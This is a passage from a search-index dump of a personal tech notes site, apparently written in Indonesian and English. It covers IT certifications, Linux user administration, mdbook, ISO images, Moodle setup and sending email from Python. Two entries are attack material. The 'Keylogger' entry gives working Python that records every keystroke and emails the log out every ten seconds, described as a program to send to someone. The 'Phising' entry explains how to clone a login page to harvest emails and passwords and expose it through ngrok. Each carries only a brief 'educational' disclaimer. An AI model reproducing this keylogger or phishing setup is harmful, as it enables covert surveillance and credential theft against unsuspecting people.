Domain and percentage of examination : Core 1 (220-1001) Planning and Scoping 15% Information Gathering and Vulnerability Identification 22% Attacks and Exploits 30% Penetration Testing Tools 17% Reporting and Communication 16% Total 100% ISACA Validate skills in IT audit, security, governance and risk. ISACA certifications are based on primary responsibility, rather than a defined level : Certified Information Systems Auditor (CISA) Certified in Risk and Information Systems Control (CRISC) Certified Information Security Manager (CISM) Certified in the Governance of Enterprise IT (CGEIT) SANS/GIAC Validate skills in security administration, management, audit, and software security; offering more than 30 specialized information security certifications that correspond to specific job duties. Cisco (CCT, CCNA, CCIE) Validates networking skills using Cisco equipment and technologies. Cisco organizes their certifications across 5 levels: Entry (CCT) Associate (CCNA) Professional (CCNP) Expert (CCIE) Architect (CCAr) CompTIA CASP+ CASP+ is an advanced certification that validates critical thinking and judgment across a spectrum of security disciplines in complex environments ISC2 CISSP ISC2 is best recognized for its CISSP credential. CISSP recognizes information security leaders who understand cybersecurity strategy. Other Certifications Jaringan : CCNA, MTCNA, MTCRE, MTCUME, MTCTCE Hacking : CEH, OSCP Forensic : CHFI Information Security (ISO27001) : CISSCP, CISA, CSCP Offensive Security Conclusion \u00b6 IT Certification \u00b6 offensive-security.com comptia.org netacad.com eccouncil.org isc2.org pmi.org aws.amazon.com/certification docs.microsoft.com/en-us/learn/certification Hardest Cert \u00b6 CISSP CCIE OSCP < Cisco GSE < GCIH < GCIA < GSEC Entry Level \u00b6 GPEN GWAPT GCIH CySA+ CompTIA Sec+ A+ Free Certification \u00b6 Cisco Cybersecurity course Introduction to Cyber Security Cyber Security Essential FORTINET CISA ICS-CERT VLP SANS CYBER ACES tenable paloalto coursera microsoft azure cybrary edx udemy Sertifikat Indonesia \u00b6 bpptik.kominfo.go.id lms.onnocenter.or.id/moodle mdamastel.id MIT Course Ware \u00b6 Computer Science","title":"IT Career Roadmap"},{"location":"tips/itcareer/#it-career-roadmap","text":"","title":"IT Career Roadmap"},{"location":"tips/itcareer/#comptia","text":"sumber : https://www.comptia.org","title":"CompTIA"},{"location":"tips/itcareer/#beginer","text":"$80251/yr 18709 looking Job Titles : System/s Administrator Network Engineer System/s Engineer Required skills at this level : Scan and assess network for vulnerabilities Monitor network traffic for unusual activity Investigate a violation when a breach occurs Install and use software to protect sensitive information Prepare reports that document security breaches Research new security technology Help end-users when they need to install or learn about new products and procedures","title":"Beginer"},{"location":"tips/itcareer/#intermediate","text":"$94,379 53,739 looking Job Titles : Security Analyst Security Engineer Pen Tester Required skills at this level : Manage and configure tools to monitor network activity Conduct penetration testing Analyze reports from tools to identify unusual network behavior Plan and recommend changes to increase the security of the network Apply security patches to protect the network Help end-users when they need to install or learn about new products and procedures Train beginner cybersecurity professionals","title":"Intermediate"},{"location":"tips/itcareer/#advance","text":"$105,033 44,331 looking Job Titles : Senior Security Engineer Senior Security Analyst CISO Required skills at this level : Manage and configure tools to monitor network activity Research the latest IT security trends Develop security standards and best practices for the organization Recommend security enhancements to management or senior staff Develop and update business continuity and disaster recovery protocols Help end-users when they need to install or learn about new products and procedures Manage and train team","title":"Advance"},{"location":"tips/itcareer/#certifications","text":"Beginer : CompTIA Network+ CompTIA Security+ Partner Certifications Intermediate : CompTIA Project+ CompTIA CySA+ CompTIA PenTest+ Partner Certifications Advance CompTIA CASP+ Partner Certifications","title":"Certifications"},{"location":"tips/itcareer/#desc-certification","text":"CompTIA It Network+ Certification : The table below lists the domains measured by the full examination and the extent to which they are represented. Domain and percentage of examination : Networking Concepts 23% Infrastructure 18% Network Operations 17% Network Security 20% Network Troubleshooting and Tools 22% Total 100% CompTIA Security+ Certification : The table below lists the domains measured by the full examination and the extent to which they are represented. Domain and percentage of examination : Threats, Attacks and Vulnerabilities 21% Technologies and Tools 22% Architecture and Design 15% Identity and Access Management 16% Risk Management 14% Cryptography and PKI 12% Total 100% CompTIA CySA+ Certification : The table below lists the domains measured by the full examination and the extent to which they are represented. Domain and percentage of examination : Core 1 (220-1001) Threat and Vulnerability Management 22% Software and Systems Security 18% Security Operations and Monitoring 25% Incident Response 22% Compliance and Assessment 13% Total 100% CompTIA Project+ Certification : The table below lists the domains measured by the full examination and the extent to which they are represented. Domain and percentage of examination : Core 1 (220-1001) Project Basics 36% Project Constraints 17% Communication and Change Management 26% Project Tools and Documentation 21% Total 100% CompTIA PenTest+ Certification : The table below lists the domains measured by the full examination and the extent to which they are represented. Domain and percentage of examination : Core 1 (220-1001) Planning and Scoping 15% Information Gathering and Vulnerability Identification 22% Attacks and Exploits 30% Penetration Testing Tools 17% Reporting and Communication 16% Total 100% ISACA Validate skills in IT audit, security, governance and risk. ISACA certifications are based on primary responsibility, rather than a defined level : Certified Information Systems Auditor (CISA) Certified in Risk and Information Systems Control (CRISC) Certified Information Security Manager (CISM) Certified in the Governance of Enterprise IT (CGEIT) SANS/GIAC Validate skills in security administration, management, audit, and software security; offering more than 30 specialized information security certifications that correspond to specific job duties. Cisco (CCT, CCNA, CCIE) Validates networking skills using Cisco equipment and technologies. Cisco organizes their certifications across 5 levels: Entry (CCT) Associate (CCNA) Professional (CCNP) Expert (CCIE) Architect (CCAr) CompTIA CASP+ CASP+ is an advanced certification that validates critical thinking and judgment across a spectrum of security disciplines in complex environments ISC2 CISSP ISC2 is best recognized for its CISSP credential. CISSP recognizes information security leaders who understand cybersecurity strategy. Other Certifications Jaringan : CCNA, MTCNA, MTCRE, MTCUME, MTCTCE Hacking : CEH, OSCP Forensic : CHFI Information Security (ISO27001) : CISSCP, CISA, CSCP Offensive Security","title":"Desc Certification"},{"location":"tips/itcareer/#conclusion","text":"","title":"Conclusion"},{"location":"tips/itcareer/#it-certification","text":"offensive-security.com comptia.org netacad.com eccouncil.org isc2.org pmi.org aws.amazon.com/certification docs.microsoft.com/en-us/learn/certification","title":"IT Certification"},{"location":"tips/itcareer/#hardest-cert","text":"CISSP CCIE OSCP < Cisco GSE < GCIH < GCIA < GSEC","title":"Hardest Cert"},{"location":"tips/itcareer/#entry-level","text":"GPEN GWAPT GCIH CySA+ CompTIA Sec+ A+","title":"Entry Level"},{"location":"tips/itcareer/#free-certification","text":"Cisco Cybersecurity course Introduction to Cyber Security Cyber Security Essential FORTINET CISA ICS-CERT VLP SANS CYBER ACES tenable paloalto coursera microsoft azure cybrary edx udemy","title":"Free Certification"},{"location":"tips/itcareer/#sertifikat-indonesia","text":"bpptik.kominfo.go.id lms.onnocenter.or.id/moodle mdamastel.id","title":"Sertifikat Indonesia"},{"location":"tips/itcareer/#mit-course-ware","text":"Computer Science","title":"MIT Course Ware"},{"location":"tips/keylogger/","text":"Keylogger \u00b6 Use wisely, only for educational and awareness purposes Basic of Keylogger \u00b6 from pynput.keyboard import Listener import logging log_dir = '/directory_you_want/' logging . basicConfig ( filename = ( log_dir + \"keyslog.txt\" ), level = logging . DEBUG , format = ' %(asctime)s : %(message)s ' ) def on_press ( key ): logging . info ( str ( key )) with Listener ( on_press = on_press ) as listener : listener . join () with above code we can capture every typing and save to file, but if we want to send the program to someone we need to send back the log file, in this case we can use email to send the log file. Sending file via email can be seen in previous post once you know the basic of keylogger and sending file using email, you will have variety of combinations of these methods Example \u00b6 here the example you can use (or use your own method) from pynput.keyboard import Key , Listener from email.mime.text import MIMEText from email.mime.image import MIMEImage from email.mime.multipart import MIMEMultipart import logging import time import os import smtplib log_dir = \"\" smtp_ssl_host = 'smtp.gmail.com' smtp_ssl_port = 465 username = 'your_email@gmail.com' password = '16_generated_password' sender = username targets = [ 'target@gmail.com' ] start = time . time () print ( \"start =\" , start ) logging . basicConfig ( filename = ( log_dir + \"keyslog.txt\" ), level = logging . DEBUG , format = ' %(asctime)s : %(message)s ' ) def on_press ( key ): global start print ( \" {0} pressed\" . format ( key )) logging . info ( str ( key )) elapse = time . time () if ( elapse - start ) > 10 : start = elapse msg = MIMEMultipart () msg [ 'Subject' ] = 'Reporting' msg [ 'From' ] = sender msg [ 'To' ] = ', ' . join ( targets ) txt = MIMEText ( 'This is the reporting' ) msg . attach ( txt ) filepath = './keyslog.txt' with open ( filepath , 'r' ) as f : img = MIMEText ( f . read ()) img . add_header ( 'Content-Disposition' , 'attachment' , filename = os . path . basename ( filepath )) msg . attach ( img ) server = smtplib . SMTP_SSL ( smtp_ssl_host , smtp_ssl_port ) server . login ( username , password ) server . sendmail ( sender , targets , msg . as_string ()) server . quit () os . system ( 'echo \"\" > keyslog.txt' ) with Listener ( on_press = on_press ) as listener : listener . join ()","title":"Keylogger"},{"location":"tips/keylogger/#keylogger","text":"Use wisely, only for educational and awareness purposes","title":"Keylogger"},{"location":"tips/keylogger/#basic-of-keylogger","text":"from pynput.keyboard import Listener import logging log_dir = '/directory_you_want/' logging . basicConfig ( filename = ( log_dir + \"keyslog.txt\" ), level = logging . DEBUG , format = ' %(asctime)s : %(message)s ' ) def on_press ( key ): logging . info ( str ( key )) with Listener ( on_press = on_press ) as listener : listener . join () with above code we can capture every typing and save to file, but if we want to send the program to someone we need to send back the log file, in this case we can use email to send the log file. Sending file via email can be seen in previous post once you know the basic of keylogger and sending file using email, you will have variety of combinations of these methods","title":"Basic of Keylogger"},{"location":"tips/keylogger/#example","text":"here the example you can use (or use your own method) from pynput.keyboard import Key , Listener from email.mime.text import MIMEText from email.mime.image import MIMEImage from email.mime.multipart import MIMEMultipart import logging import time import os import smtplib log_dir = \"\" smtp_ssl_host = 'smtp.gmail.com' smtp_ssl_port = 465 username = 'your_email@gmail.com' password = '16_generated_password' sender = username targets = [ 'target@gmail.com' ] start = time . time () print ( \"start =\" , start ) logging . basicConfig ( filename = ( log_dir + \"keyslog.txt\" ), level = logging . DEBUG , format = ' %(asctime)s : %(message)s ' ) def on_press ( key ): global start print ( \" {0} pressed\" . format ( key )) logging . info ( str ( key )) elapse = time . time () if ( elapse - start ) > 10 : start = elapse msg = MIMEMultipart () msg [ 'Subject' ] = 'Reporting' msg [ 'From' ] = sender msg [ 'To' ] = ', ' . join ( targets ) txt = MIMEText ( 'This is the reporting' ) msg . attach ( txt ) filepath = './keyslog.txt' with open ( filepath , 'r' ) as f : img = MIMEText ( f . read ()) img . add_header ( 'Content-Disposition' , 'attachment' , filename = os . path . basename ( filepath )) msg . attach ( img ) server = smtplib . SMTP_SSL ( smtp_ssl_host , smtp_ssl_port ) server . login ( username , password ) server . sendmail ( sender , targets , msg . as_string ()) server . quit () os . system ( 'echo \"\" > keyslog.txt' ) with Listener ( on_press = on_press ) as listener : listener . join ()","title":"Example"},{"location":"tips/linux-user-group/","text":"Linux User & Group \u00b6 Cek User : \u00b6 cat /etc/passwd atau cat /etc/passwd | cut -d: -f1 root : x : 0 : 0 : root : /root : /usr/bin/zsh user : pass : uid : gid : comment : homedir : shell check id user id tecmint Cek Group : \u00b6 cat /etc/group atau cat /etc/group | cut -d: -f1 kaboxer : x : 146 : syahrul,root gname : pass : GID : users Add user \u00b6 sumber : https://www.tecmint.com/add-users-in-linux/ mkdir <nama_user> useradd <nama_user> passwd <nama_user> membuat user untuk directory tertentu useradd -d /home/carloz/coba <nama_user> membuat user dengan user id useradd -u 999 <nama_user> # default id 500, 501, 502, and so on... membuat user dengan group id useradd -u 1000 -g 500 <nama_user> menambahkan user pada group useradd -G admins,webadmin,developers <nama_user> menambah user tanpa home directory useradd -M <nama_user> menambah user dengan batas akun expiry useradd -e 2014-03-27 <nama_user> Next, verify the age of account and password with \u2018chage\u2018 command for user \u2018<nama_user>\u2018 after setting account expiry date. chage -l aparna Last password change : Mar 28, 2014 Password expires : never Password inactive : never Account expires : Mar 27, 2014 Minimum number of days between password change : 0 Maximum number of days between password change : 99999 Number of days of warning before password expires : 7 menambah user dengan batas password expiry useradd -e 2014-04-27 -f 45 <nama_user> menambah user dengan shell yang disediakan useradd -s /sbin/nologin <nama_user> menambah user dengan custom command useradd -c \"Aku ganteng dan aku bangga\" <nama_user> contoh hasil Add a User with Specific Home Directory, Default Shell and Custom Comment This command will create a user \u2018ravi\u2018 with home directory \u2018/var/www/tecmint\u2018, default shell /bin/bash and adds extra information about user. In the above command \u2018-m -d\u2018 option creates a user with specified home directory and the \u2018-s\u2018 option set the user\u2019s default shell i.e. /bin/bash. The \u2018-c\u2018 option adds the extra information about user and \u2018-U\u2018 argument create/adds a group with the same name as the user. useradd -m -d /var/www/ravi -s /bin/bash -c \"TecMint Owner\" -U ravi Add a User with Home Directory, No Shell, Custom Comment and User ID The following command is very much similar to above two commands, the only difference is here, that we disabling login shell to a user called \u2018avishek\u2018 with custom User ID (i.e. 1019). Here \u2018-s\u2018 option adds the default shell /bin/bash, but in this case we set login to \u2018/usr/sbin/nologin\u2018. That means user \u2018avishek\u2018 will not able to login into the system. useradd -m -d /var/www/avishek -s /usr/sbin/nologin -c \"TecMint Sr. Technical Writer\" -u 1019 avishek Add a User without Home Directory, No Shell, No Group and Custom Comment This following command is very different than the other commands explained above. Here we used \u2018-M\u2018 option to create user without user\u2019s home directory and \u2018-N\u2018 argument is used that tells the system to only create username (without group). The \u2018-r\u2018 arguments is for creating a system user. useradd -M -N -r -s /bin/false -c \"Disabled TecMint Member\" clayton","title":"Linux Users & Groups"},{"location":"tips/linux-user-group/#linux-user-group","text":"","title":"Linux User &amp; Group"},{"location":"tips/linux-user-group/#cek-user","text":"cat /etc/passwd atau cat /etc/passwd | cut -d: -f1 root : x : 0 : 0 : root : /root : /usr/bin/zsh user : pass : uid : gid : comment : homedir : shell check id user id tecmint","title":"Cek User :"},{"location":"tips/linux-user-group/#cek-group","text":"cat /etc/group atau cat /etc/group | cut -d: -f1 kaboxer : x : 146 : syahrul,root gname : pass : GID : users","title":"Cek Group :"},{"location":"tips/linux-user-group/#add-user","text":"sumber : https://www.tecmint.com/add-users-in-linux/ mkdir <nama_user> useradd <nama_user> passwd <nama_user> membuat user untuk directory tertentu useradd -d /home/carloz/coba <nama_user> membuat user dengan user id useradd -u 999 <nama_user> # default id 500, 501, 502, and so on... membuat user dengan group id useradd -u 1000 -g 500 <nama_user> menambahkan user pada group useradd -G admins,webadmin,developers <nama_user> menambah user tanpa home directory useradd -M <nama_user> menambah user dengan batas akun expiry useradd -e 2014-03-27 <nama_user> Next, verify the age of account and password with \u2018chage\u2018 command for user \u2018<nama_user>\u2018 after setting account expiry date. chage -l aparna Last password change : Mar 28, 2014 Password expires : never Password inactive : never Account expires : Mar 27, 2014 Minimum number of days between password change : 0 Maximum number of days between password change : 99999 Number of days of warning before password expires : 7 menambah user dengan batas password expiry useradd -e 2014-04-27 -f 45 <nama_user> menambah user dengan shell yang disediakan useradd -s /sbin/nologin <nama_user> menambah user dengan custom command useradd -c \"Aku ganteng dan aku bangga\" <nama_user>","title":"Add user"},{"location":"tips/mdbook/","text":"mdbook \u00b6 simpelnya, mdbook adalah jika kita ingin membuat catatan berupa web, kita cukup menulis lewat markdown, maka secara otomatis dibuatkan websitenya, lalu tinggal diupload ke hosting mirip seperti CMS tapi versi HTML ada banyak cara install, salah satunya yang saya gunakan : (ubuntu 20.04) Cara 1 \u00b6 cara ini kadang gagal :D install rush : curl https://sh.rustup.rs -sSf | sh install cargo : sudo apt install cargo install mdbook : sudo cargo install mdbook Cara 2 / cara yang paling mudah : \u00b6 sudo apt install cargo cargo install --git https://github.com/rust-lang/mdBook.git mdbook atau cari referensi di internet \"install mdbook\" jika cara diatas gagal :D, salah satu link referensi ada di bawah setelah selesai install : \u00b6 membuat folder : mkdir tes cd tes make init : mdbook init maka akan ada 3 item : book : berisi file keseluruhan/hasil, yang diupload ke hosting book.toml : berisi configurasi src : berisi source untuk kita menambah/hapus/mengedit konten, dan mengatur navigasi compile program : (untuk membuat isi book ) mdbook build run : dijalankan jika ingin menggunakan mdbook mode IP mdbook serve ada 2021-02-28 10:21:10 [INFO] (warp::server): listening on http://127.0.0.1:3000 lalu copas link http://127.0.0.1:3000 , masukkan di browser atau dapat masukkan link directory file:///<directory>/book/<file>.html Configurasi \u00b6 untuk configurasi pusat ada di /home/<user>/.cargo/git/checkouts/mdbook-468dfae15ac0a68f/536873c atau tergantung versi mdbooknya bacaan utamanya ada di dalam folder guide / guide/src/format/config.md / guide/src/format/theme/README.md / src / src/theme salah satu referensi penggunaan mdbook : \u00b6 https://rust-lang.github.io/mdBook/ atau https://github.com/rust-lang/mdBook link sama saja :D beberapa syntax \u00b6 # Markdown tests Tests for some markdown output. ## Tables | foo | bar | | --- | --- | | baz | bim | ## Footnotes Footnote example[^1], or with a word[^word]. [^1]: This is a footnote. [^word]: A longer footnote. With multiple lines. Third line. ## Blockquote > tes >> tes2 >>> tes3 ## Strikethrough ~~strikethrough example~~ ## Tasklisks - [X] Apples - [X] Broccoli - [ ] Carrots \\{{#include guide-this-website.md::}} Markdown tests \u00b6 Tests for some markdown output. Tables \u00b6 foo bar baz bim Footnotes \u00b6 Footnote example 1 , or with a word 2 . Blockquote \u00b6 tes tes2 tes3 Strikethrough \u00b6 strikethrough example Tasklisks \u00b6 Apples Broccoli Carrots {{#include guide-this-website.md::}} This is a footnote. \u21a9 A longer footnote. With multiple lines. Third line. \u21a9","title":"Mdbook"},{"location":"tips/mdbook/#mdbook","text":"simpelnya, mdbook adalah jika kita ingin membuat catatan berupa web, kita cukup menulis lewat markdown, maka secara otomatis dibuatkan websitenya, lalu tinggal diupload ke hosting mirip seperti CMS tapi versi HTML ada banyak cara install, salah satunya yang saya gunakan : (ubuntu 20.04)","title":"mdbook"},{"location":"tips/mdbook/#cara-1","text":"cara ini kadang gagal :D install rush : curl https://sh.rustup.rs -sSf | sh install cargo : sudo apt install cargo install mdbook : sudo cargo install mdbook","title":"Cara 1"},{"location":"tips/mdbook/#cara-2-cara-yang-paling-mudah","text":"sudo apt install cargo cargo install --git https://github.com/rust-lang/mdBook.git mdbook atau cari referensi di internet \"install mdbook\" jika cara diatas gagal :D, salah satu link referensi ada di bawah","title":"Cara 2 / cara yang paling mudah :"},{"location":"tips/mdbook/#setelah-selesai-install","text":"membuat folder : mkdir tes cd tes make init : mdbook init maka akan ada 3 item : book : berisi file keseluruhan/hasil, yang diupload ke hosting book.toml : berisi configurasi src : berisi source untuk kita menambah/hapus/mengedit konten, dan mengatur navigasi compile program : (untuk membuat isi book ) mdbook build run : dijalankan jika ingin menggunakan mdbook mode IP mdbook serve ada 2021-02-28 10:21:10 [INFO] (warp::server): listening on http://127.0.0.1:3000 lalu copas link http://127.0.0.1:3000 , masukkan di browser atau dapat masukkan link directory file:///<directory>/book/<file>.html","title":"setelah selesai install :"},{"location":"tips/mdbook/#configurasi","text":"untuk configurasi pusat ada di /home/<user>/.cargo/git/checkouts/mdbook-468dfae15ac0a68f/536873c atau tergantung versi mdbooknya bacaan utamanya ada di dalam folder guide / guide/src/format/config.md / guide/src/format/theme/README.md / src / src/theme","title":"Configurasi"},{"location":"tips/mdbook/#salah-satu-referensi-penggunaan-mdbook","text":"https://rust-lang.github.io/mdBook/ atau https://github.com/rust-lang/mdBook link sama saja :D","title":"salah satu referensi penggunaan mdbook :"},{"location":"tips/mdbook/#beberapa-syntax","text":"# Markdown tests Tests for some markdown output. ## Tables | foo | bar | | --- | --- | | baz | bim | ## Footnotes Footnote example[^1], or with a word[^word]. [^1]: This is a footnote. [^word]: A longer footnote. With multiple lines. Third line. ## Blockquote > tes >> tes2 >>> tes3 ## Strikethrough ~~strikethrough example~~ ## Tasklisks - [X] Apples - [X] Broccoli - [ ] Carrots \\{{#include guide-this-website.md::}}","title":"beberapa syntax"},{"location":"tips/mdbook/#markdown-tests","text":"Tests for some markdown output.","title":"Markdown tests"},{"location":"tips/mdbook/#tables","text":"foo bar baz bim","title":"Tables"},{"location":"tips/mdbook/#footnotes","text":"Footnote example 1 , or with a word 2 .","title":"Footnotes"},{"location":"tips/mdbook/#blockquote","text":"tes tes2 tes3","title":"Blockquote"},{"location":"tips/mdbook/#strikethrough","text":"strikethrough example","title":"Strikethrough"},{"location":"tips/mdbook/#tasklisks","text":"Apples Broccoli Carrots {{#include guide-this-website.md::}} This is a footnote. \u21a9 A longer footnote. With multiple lines. Third line. \u21a9","title":"Tasklisks"},{"location":"tips/membuat-file-iso/","text":"Membuat File ISO \u00b6 Misalnya, CD atau DVD terdapat di /media/cdrom atau /dev/cdrom File iso akan di simpan di folder /folder/ Nama file iso adalah file.iso Perintah yang perlu di jalankan adalah dd if=/dev/cdrom of=/folder/file.iso Kalau ingin ada progress bar dd bs=4M if=path/to/archlinux.iso of=/dev/sdx status=progress oflag=sync File iso tampaknya tidak peduli format yang digunakan sebelum-nya. Kita dapat dengan mudah membuat file iso dari, CD / DVD Installer Linux CD / DVD Installer Windows atau Aplikasi Windows CD lagu DVD film Teknik ini menjadi sangat baik untuk mem-backup CD atau DVD Menempelkan file iso ke sebuah folder Jika anda mempunyai file iso dan ingin menempelkan (mount) ke file system. Misalnya, File iso akan di simpan di folder /folder/ Nama file iso adalah file.iso Folder tempat menempelkan adalah /mnt/tempel mkdir /mnt/tempel mount -t iso9660 -o loop /folder/file.iso /mnt/tempel Untuk melihat apakah sudah ter-mount-ing dengan baik, lakukan ls /mnt/tempel dir /mnt/tempel atau cara lain \u00b6 mkdir tes sudo mount -o loop my-iso-image.iso tes Verify : mount # or `df -H` or `ls -l tes` Unmount : sudo umount tes","title":"Membuat File ISO"},{"location":"tips/membuat-file-iso/#membuat-file-iso","text":"\u00b6 Misalnya, CD atau DVD terdapat di /media/cdrom atau /dev/cdrom File iso akan di simpan di folder /folder/ Nama file iso adalah file.iso Perintah yang perlu di jalankan adalah dd if=/dev/cdrom of=/folder/file.iso Kalau ingin ada progress bar dd bs=4M if=path/to/archlinux.iso of=/dev/sdx status=progress oflag=sync File iso tampaknya tidak peduli format yang digunakan sebelum-nya. Kita dapat dengan mudah membuat file iso dari, CD / DVD Installer Linux CD / DVD Installer Windows atau Aplikasi Windows CD lagu DVD film Teknik ini menjadi sangat baik untuk mem-backup CD atau DVD","title":"Membuat File ISO"},{"location":"tips/membuat-file-iso/#atau-cara-lain","text":"mkdir tes sudo mount -o loop my-iso-image.iso tes Verify : mount # or `df -H` or `ls -l tes` Unmount : sudo umount tes","title":"atau cara lain"},{"location":"tips/moodle/","text":"Moodle \u00b6 Install Moodle Server Lokal masuk server : (asumsi sudah terinstall apache2, mysql, phpmyadmin) sudo su apt update apt -y install software-properties-common add-apt-repository ppa:ondrej/php apt update apt -y install php apt -y install php-common php-mysql php-xml php-xmlrpc php-curl php-gd php-imagick php-cli php-dev php-imap php-mbstring php-opcache php-soap php-zip php-cli php-intl imagemagick git zip libgd-dev libapache2-mod-php lalu vi /etc/php/&lt;versi>/apache2/php.ini lalu upload_max_filesize = 100M post_max_size = 48M memory_limit = 512M max_execution_time = 600 max_input_vars = 3000 max_input_time = 1000 systemctl restart apache2.service vi /var/www/html/phpinfo.php <?php phpinfo( ); ?> buat database moodle (aku lwat phpmyadmin) mkdir -p /var/moodledata/lang cd /var/moodledata/lang wget https://download.moodle.org/download.php/direct/langpack/3.8/id.zip unzip id.zip chmod -Rf 777 /var/moodledata/lang/ chown -Rf www-data: /var/moodledata/lang/ cd /home/user/ # wget https://download.moodle.org/download.php/direct/stable38/moodle-latest-38.tgz wget https://download.moodle.org/download.php/stable310/moodle-3.10.1.tgz tar zxvf moodle-3.10.1.tgz mv moodle /var/www/html/ cd /var/www/html/ chown -Rf www-data: /var/moodledata/ chmod -Rf 777 /var/www/html/moodle chown -Rf www-data: /var/www/html/moodle lanjut instalalsi di web *catatan : Data Directory /var/moodledata/","title":"Install Moodle"},{"location":"tips/moodle/#moodle","text":"Install Moodle Server Lokal masuk server : (asumsi sudah terinstall apache2, mysql, phpmyadmin) sudo su apt update apt -y install software-properties-common add-apt-repository ppa:ondrej/php apt update apt -y install php apt -y install php-common php-mysql php-xml php-xmlrpc php-curl php-gd php-imagick php-cli php-dev php-imap php-mbstring php-opcache php-soap php-zip php-cli php-intl imagemagick git zip libgd-dev libapache2-mod-php lalu vi /etc/php/&lt;versi>/apache2/php.ini lalu upload_max_filesize = 100M post_max_size = 48M memory_limit = 512M max_execution_time = 600 max_input_vars = 3000 max_input_time = 1000 systemctl restart apache2.service vi /var/www/html/phpinfo.php <?php phpinfo( ); ?> buat database moodle (aku lwat phpmyadmin) mkdir -p /var/moodledata/lang cd /var/moodledata/lang wget https://download.moodle.org/download.php/direct/langpack/3.8/id.zip unzip id.zip chmod -Rf 777 /var/moodledata/lang/ chown -Rf www-data: /var/moodledata/lang/ cd /home/user/ # wget https://download.moodle.org/download.php/direct/stable38/moodle-latest-38.tgz wget https://download.moodle.org/download.php/stable310/moodle-3.10.1.tgz tar zxvf moodle-3.10.1.tgz mv moodle /var/www/html/ cd /var/www/html/ chown -Rf www-data: /var/moodledata/ chmod -Rf 777 /var/www/html/moodle chown -Rf www-data: /var/www/html/moodle lanjut instalalsi di web *catatan : Data Directory /var/moodledata/","title":"Moodle"},{"location":"tips/phising/","text":"Phising \u00b6 Use wisely, only for educational and awareness purposes you can directly use blackeye for phising, or you can design your own web page because sometimes the website design has changed concept : copy the index.php , ip.php , login.html , & login.php from blackeye (you can randomly choose one) copy the web page source code (view pages source) and paste into login.html , change the <form action=\"...\"> into <form action=\"login.php\"> , and also the name parameter of email and password run php -S localhost:12345 (your preferred port) run ngrok http 12345 done","title":"Phising"},{"location":"tips/phising/#phising","text":"Use wisely, only for educational and awareness purposes you can directly use blackeye for phising, or you can design your own web page because sometimes the website design has changed concept : copy the index.php , ip.php , login.html , & login.php from blackeye (you can randomly choose one) copy the web page source code (view pages source) and paste into login.html , change the <form action=\"...\"> into <form action=\"login.php\"> , and also the name parameter of email and password run php -S localhost:12345 (your preferred port) run ngrok http 12345 done","title":"Phising"},{"location":"tips/py_email/","text":"Sending Email with Python \u00b6 June 6 th , 2022 Before you send email from pyhon script, you should know that sending by email means you have to enter your credentials into your python script. So that means its' dangerous right? luckily google had taken care of that problem, google gives access to get login without actual password, so google will just make generated password in certain activity(email/callendar/etc). so to make it clear, you can check how to make grant app google credential in this link (use it wisely, make sure no one knows your generated password) after waching that video, you will have 16 generated password that you can use to login from your app send_text.py send_file.py import smtplib from email.mime.text import MIMEText smtp_ssl_host = 'smtp.gmail.com' smtp_ssl_port = 465 email = 'your_email@gmail.com' password = '<16_generated_password>' sender = email targets = [ 'receiver@gmail.com' ] msg = MIMEText ( 'Hi, how are you today?' ) msg [ 'Subject' ] = 'Hello' msg [ 'From' ] = sender msg [ 'To' ] = ', ' . join ( targets ) server = smtplib . SMTP_SSL ( smtp_ssl_host , smtp_ssl_port ) server . login ( email , password ) server . sendmail ( sender , targets , msg . as_string ()) server . quit () import os import smtplib from email.mime.text import MIMEText from email.mime.image import MIMEImage from email.mime.multipart import MIMEMultipart smtp_ssl_host = 'smtp.gmail.com' # smtp.mail.yahoo.com smtp_ssl_port = 465 email = 'your_email@gmail.com' password = '<16_generated_password>' sender = email targets = [ 'receiver@gmail.com' ] msg = MIMEMultipart () msg [ 'Subject' ] = 'I have a picture' msg [ 'From' ] = sender msg [ 'To' ] = ', ' . join ( targets ) txt = MIMEText ( 'I just bought a new camera.' ) msg . attach ( txt ) filepath = './file.txt' with open ( filepath , 'r' ) as f : file_att = MIMEText ( f . read ()) # filepath_img = './file.jpg' # with open(filepath_img, 'rb') as f: # file_att = MIMEImage(f.read()) file_att . add_header ( 'Content-Disposition' , 'attachment' , filename = os . path . basename ( filepath )) msg . attach ( file_att ) server = smtplib . SMTP_SSL ( smtp_ssl_host , smtp_ssl_port ) server . login ( username , password ) server . sendmail ( sender , targets , msg . as_string ()) server . quit () $ python <file_name.py> that's all, check your mail box","title":"Python Email"},{"location":"tips/py_email/#sending-email-with-python","text":"June 6 th , 2022 Before you send email from pyhon script, you should know that sending by email means you have to enter your credentials into your python script. So that means its' dangerous right? luckily google had taken care of that problem, google gives access to get login without actual password, so google will just make generated password in certain activity(email/callendar/etc). so to make it clear, you can check how to make grant app google credential in this link (use it wisely, make sure no one knows your generated password) after waching that video, you will have 16 generated password that you can use to login from your app send_text.py send_file.py import smtplib from email.mime.text import MIMEText smtp_ssl_host = 'smtp.gmail.com' smtp_ssl_port = 465 email = 'your_email@gmail.com' password = '<16_generated_password>' sender = email targets = [ 'receiver@gmail.com' ] msg = MIMEText ( 'Hi, how are you today?' ) msg [ 'Subject' ] = 'Hello' msg [ 'From' ] = sender msg [ 'To' ] = ', ' . join ( targets ) server = smtplib . SMTP_SSL ( smtp_ssl_host , smtp_ssl_port ) server . login ( email , password ) server . sendmail ( sender , targets , msg . as_string ()) server . quit () import os import smtplib from email.mime.text import MIMEText from email.mime.image import MIMEImage from email.mime.multipart import MIMEMultipart smtp_ssl_host = 'smtp.gmail.com' # smtp.mail.yahoo.com smtp_ssl_port = 465 email = 'your_email@gmail.com' password = '<16_generated_password>' sender = email targets = [ 'receiver@gmail.com' ] msg = MIMEMultipart () msg [ 'Subject' ] = 'I have a picture' msg [ 'From' ] = sender msg [ 'To' ] = ', ' . join ( targets ) txt = MIMEText ( 'I just bought a new camera.' ) msg . attach ( txt ) filepath = './file.txt' with open ( filepath , 'r' ) as f : file_att = MIMEText ( f . read ()) # filepath_img = './file.jpg' # with open(filepath_img, 'rb') as f: # file_att = MIMEImage(f.read()) file_att . add_header ( 'Content-Disposition' , 'attachment' , filename = os . path . basename ( filepath )) msg . attach ( file_att ) server = smtplib . SMTP_SSL ( smtp_ssl_host , smtp_ssl_port ) server . login ( username , password ) server . sendmail ( sender , targets , msg . as_string ()) server . quit () $ python <file_name.py> that's all, check your mail box","title":"Sending Email with Python"},{"location":"tips/replikasi-onnocenter/","text":"Replikasi Mediawiki https://lms.onnocenter.or.id/wiki/ ubuntu 20.04, khusus mediawiki-1.32.0 \u00b6 server : install mediawiki : buat tempat menyimpan keperlannya mkdir /var/data mkdir /var/data/library mkdir /var/data/library/datawiki sudo 